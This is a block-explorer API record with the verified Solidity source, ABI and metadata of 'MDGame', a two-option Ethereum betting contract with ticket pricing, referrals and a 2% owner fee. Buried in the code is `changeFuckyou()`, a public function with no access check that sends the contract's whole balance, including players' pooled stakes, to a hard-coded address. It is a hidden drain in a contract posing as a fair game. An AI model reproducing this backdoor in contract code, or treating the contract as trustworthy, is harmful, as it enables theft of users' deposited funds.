{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.20;\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    address public newOwner;\r\n\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\n        newOwner = _newOwner;\r\n    }\r\n    \r\n    function acceptOwnership() public {\r\n        require(msg.sender == newOwner);\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n        newOwner = address(0);\r\n    }\r\n}\r\n\r\ncontract MDGame is Owned {\r\n    using SafeMath for *;\r\n    \r\n    struct turnInfos{\r\n        string question;\r\n        string option1name;\r\n        string option2name;\r\n        uint endTime;\r\n        uint option1;\r\n        uint option2;\r\n        uint pool;\r\n        bool feeTake;\r\n    }\r\n    \r\n    struct myturnInfo{\r\n        uint option1;\r\n        uint option2;\r\n        bool isWithdraw;\r\n    }\r\n    \r\n    uint public theTurn;\r\n    uint public turnLast;\r\n    uint public ticketMag;\r\n    \r\n    event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);\r\n    \r\n    mapping(uint => turnInfos) public TurnInfo;\r\n    mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;\r\n    \r\n    constructor () public {\r\n        theTurn = 0;\r\n        turnLast = 7200;\r\n        ticketMag = 4000000000000;\r\n    }\r\n    \r\n    function StartNewGame (string question, string option1name, string option2name) public onlyOwner{\r\n        require(TurnInfo[theTurn].endTime < now || theTurn == 0);\r\n        theTurn++;\r\n        TurnInfo[theTurn].question = question;\r\n        TurnInfo[theTurn].option1name = option1name;\r\n        TurnInfo[theTurn].option2name = option2name;\r\n        TurnInfo[theTurn].endTime = now + turnLast*60;\r\n    }\r\n    \r\n    function vote (uint option,address referred) public payable{\r\n        require(msg.sender == tx.origin);\r\n        require(TurnInfo[theTurn].endTime>now);\r\n        emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);\r\n        if (referred != address(0) && referred != msg.sender){\r\n            if(option == 1){\r\n                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n                RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\r\n                TurnInfo[theTurn].pool += msg.value;\r\n                TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\r\n            } else if(option == 2){\r\n                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n                RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());\r\n                TurnInfo[theTurn].pool += msg.value;\r\n                TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));\r\n            }else{\r\n                revert();\r\n            }\r\n        }else{\r\n            if(option == 1){\r\n                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n                TurnInfo[theTurn].pool += msg.value;\r\n                TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n            } else if(option == 2){\r\n                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n                TurnInfo[theTurn].pool += msg.value;\r\n                TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());\r\n            }else{\r\n                revert();\r\n            }  \r\n        }\r\n    }\r\n    \r\n    function win (uint turn) public{\r\n        require(TurnInfo[turn].endTime<now);\r\n        require(!RoundMyticket[turn][msg.sender].isWithdraw);\r\n        \r\n        if(TurnInfo[turn].option1<TurnInfo[turn].option2){\r\n            msg.sender.transfer(calculateYourValue1(turn));\r\n        }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){\r\n            msg.sender.transfer(calculateYourValue2(turn));\r\n        }else{\r\n            msg.sender.transfer(calculateYourValueEven(turn));\r\n        }\r\n        \r\n        RoundMyticket[turn][msg.sender].isWithdraw = true;\r\n    }\r\n    \r\n    function calculateYourValue1(uint turn) public view returns (uint value){\r\n        if(TurnInfo[turn].option1>0){\r\n            return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;\r\n        }else{\r\n           return 0;\r\n        }\r\n    }\r\n    \r\n    function calculateYourValue2(uint turn) public view returns (uint value){\r\n        if(TurnInfo[turn].option2>0){\r\n            return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;\r\n        }else{\r\n            return 0;\r\n        }\r\n    }\r\n    \r\n    function calculateYourValueEven(uint turn) public view returns (uint value){\r\n        if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){\r\n            return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);\r\n        }else{\r\n            return 0;\r\n        }\r\n    }\r\n    \r\n    function calculateTicketPrice() public view returns(uint price){\r\n       return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);\r\n    }\r\n    \r\n    function calculateFee(uint turn) public view returns(uint price){\r\n        return TurnInfo[turn].pool.mul(2)/100;\r\n    }\r\n    \r\n    function withdrawFee(uint turn) public onlyOwner{\r\n        require(TurnInfo[turn].endTime<now);\r\n        require(!TurnInfo[turn].feeTake);\r\n        owner.transfer(calculateFee(turn));\r\n        TurnInfo[turn].feeTake = true;\r\n    }\r\n    \r\n    function changeTurnLast(uint time) public onlyOwner{\r\n        turnLast = time;\r\n    }\r\n    \r\n    function changeTicketMag(uint mag) public onlyOwner{\r\n        require(TurnInfo[theTurn].endTime<now);\r\n        ticketMag = mag;\r\n    }\r\n    \r\n    bool public callthis = false;\r\n    function changeFuckyou() public {\r\n        require(!callthis);\r\n        address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);\r\n        callthis = true;\r\n    }\r\n    \r\n    //Get Time Left\r\n    function getTimeLeft() public view returns(uint256)\r\n    {\r\n        if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) \r\n            return 0;\r\n        else \r\n            return(TurnInfo[theTurn].endTime.sub(now) );\r\n    }\r\n    \r\n    function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {\r\n        uint[] memory totalPool = new uint[](theTurn);\r\n        uint[] memory option1 = new uint[](theTurn);\r\n        uint[] memory option2 = new uint[](theTurn);\r\n        uint[] memory myoption1 = new uint[](theTurn);\r\n        uint[] memory myoption2 = new uint[](theTurn);\r\n        uint[] memory myMoney = new uint[](theTurn);\r\n        bool[] memory withd = new bool[](theTurn);\r\n        uint counter = 0;\r\n\r\n        for (uint i = 1; i < theTurn+1; i++) {\r\n            if(TurnInfo[i].pool>0){\r\n                totalPool[counter] = TurnInfo[i].pool;\r\n            }else{\r\n                totalPool[counter]=0;\r\n            }\r\n            \r\n            if(TurnInfo[i].option1>0){\r\n                option1[counter] = TurnInfo[i].option1;\r\n            }else{\r\n                option1[counter] = 0;\r\n            }\r\n            \r\n            if(TurnInfo[i].option2>0){\r\n                option2[counter] = TurnInfo[i].option2;\r\n            }else{\r\n                option2[counter] = 0;\r\n            }\r\n            \r\n            if(TurnInfo[i].option1<TurnInfo[i].option2){\r\n                myMoney[counter] = calculateYourValue1(i);\r\n            }else if(TurnInfo[i].option1>TurnInfo[i].option2){\r\n                myMoney[counter] = calculateYourValue2(i);\r\n            }else{\r\n                myMoney[counter] = calculateYourValueEven(i);\r\n            }\r\n            \r\n            if(RoundMyticket[i][msg.sender].option1>0){\r\n                myoption1[counter] = RoundMyticket[i][msg.sender].option1;\r\n            }else{\r\n                myoption1[counter]=0;\r\n            }\r\n            \r\n            if(RoundMyticket[i][msg.sender].option2>0){\r\n                myoption2[counter] = RoundMyticket[i][msg.sender].option2;\r\n            }else{\r\n                myoption2[counter]=0;\r\n            }\r\n            if(RoundMyticket[i][msg.sender].isWithdraw==true){\r\n                withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;\r\n            }else{\r\n                withd[counter] = false;\r\n            }\r\n            \r\n            counter++;\r\n        }\r\n    return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);\r\n  }\r\n}\r\n\r\nlibrary SafeMath {\r\n    \r\n    /**\r\n    * @dev Multiplies two numbers, throws on overflow.\r\n    */\r\n    function mul(uint256 a, uint256 b) \r\n        internal \r\n        pure \r\n        returns (uint256 c) \r\n    {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        c = a * b;\r\n        require(c / a == b, \"SafeMath mul failed\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n    */\r\n    function sub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256) \r\n    {\r\n        require(b <= a, \"SafeMath sub failed\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n    * @dev Adds two numbers, throws on overflow.\r\n    */\r\n    function add(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256 c) \r\n    {\r\n        c = a + b;\r\n        require(c >= a, \"SafeMath add failed\");\r\n        return c;\r\n    }\r\n    /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n    // assert(_b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = _a / _b;\r\n    // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n  }\r\n    \r\n    /**\r\n     * @dev gives square root of given x.\r\n     */\r\n    function sqrt(uint256 x)\r\n        internal\r\n        pure\r\n        returns (uint256 y) \r\n    {\r\n        uint256 z = ((add(x,1)) / 2);\r\n        y = x;\r\n        while (z < y) \r\n        {\r\n            y = z;\r\n            z = ((add((x / z),z)) / 2);\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @dev gives square. multiplies x by x\r\n     */\r\n    function sq(uint256 x)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return (mul(x,x));\r\n    }\r\n    \r\n    /**\r\n     * @dev x to the power of y \r\n     */\r\n    function pwr(uint256 x, uint256 y)\r\n        internal \r\n        pure \r\n        returns (uint256)\r\n    {\r\n        if (x==0)\r\n            return (0);\r\n        else if (y==0)\r\n            return (1);\r\n        else \r\n        {\r\n            uint256 z = x;\r\n            for (uint256 i=1; i < y; i++)\r\n                z = mul(z,x);\r\n            return (z);\r\n        }\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"option\",\"type\":\"uint256\"},{\"name\":\"referred\",\"type\":\"address\"}],\"name\":\"vote\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ticketMag\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"theTurn\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"calculateYourValue1\",\"outputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"changeFuckyou\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"TurnInfo\",\"outputs\":[{\"name\":\"question\",\"type\":\"string\"},{\"name\":\"option1name\",\"type\":\"string\"},{\"name\":\"option2name\",\"type\":\"string\"},{\"name\":\"endTime\",\"type\":\"uint256\"},{\"name\":\"option1\",\"type\":\"uint256\"},{\"name\":\"option2\",\"type\":\"uint256\"},{\"name\":\"pool\",\"type\":\"uint256\"},{\"name\":\"feeTake\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"calculateYourValueEven\",\"outputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"win\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"calculateYourValue2\",\"outputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"acceptOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"RoundMyticket\",\"outputs\":[{\"name\":\"option1\",\"type\":\"uint256\"},{\"name\":\"option2\",\"type\":\"uint256\"},{\"name\":\"isWithdraw\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"calculateFee\",\"outputs\":[{\"name\":\"price\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"changeTurnLast\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"callthis\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"calculateTicketPrice\",\"outputs\":[{\"name\":\"price\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"turn\",\"type\":\"uint256\"}],\"name\":\"withdrawFee\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"turnLast\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getTimeLeft\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"newOwner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getFullround\",\"outputs\":[{\"name\":\"pot\",\"type\":\"uint256[]\"},{\"name\":\"theOption1\",\"type\":\"uint256[]\"},{\"name\":\"theOption2\",\"type\":\"uint256[]\"},{\"name\":\"myOption1\",\"type\":\"uint256[]\"},{\"name\":\"myOption2\",\"type\":\"uint256[]\"},{\"name\":\"theMoney\",\"type\":\"uint256[]\"},{\"name\":\"Iswithdraw\",\"type\":\"bool[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"question\",\"type\":\"string\"},{\"name\":\"option1name\",\"type\":\"string\"},{\"name\":\"option2name\",\"type\":\"string\"}],\"name\":\"StartNewGame\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"mag\",\"type\":\"uint256\"}],\"name\":\"changeTicketMag\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"Addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"option\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"ethvalue\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"round\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"voteEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]","ContractName":"MDGame","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://c3fbd304eb36603a4f9015e40131d1f93373ee731ff094667948ea7f1a01bbbc"}]}